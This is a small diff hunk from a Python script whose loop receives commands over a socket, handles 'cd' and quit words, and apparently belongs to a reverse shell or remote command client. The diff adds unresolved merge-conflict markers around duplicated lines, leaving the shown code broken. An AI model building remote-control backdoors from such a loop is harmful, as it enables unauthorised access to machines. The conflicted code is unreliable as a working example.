@@ -17,10 +17,17 @@ while True:
 	cmd = client.recv(1024).decode() #receive the command
 	#print(f'[*] Receive: {cmd}')
 
+<<<<<<< HEAD
 	if cmd[:2] == 'cd': 
 		os.chdir(cmd[3:]) #change directory command using os.chdir
 
 	#allow user to quit, 
+=======
+	if cmd[:2] == 'cd':
+		os.chdir(cmd[3:]) #change directory command using os.chdir
+
+	#allow user to quit
+>>>>>>> 7dccb935c0b9a82a4932fb0ba2b4b37d113984ac
 	quit = ['q', 'quit', 'x', 'exit']
 	if cmd.lower() in quit:
 		break
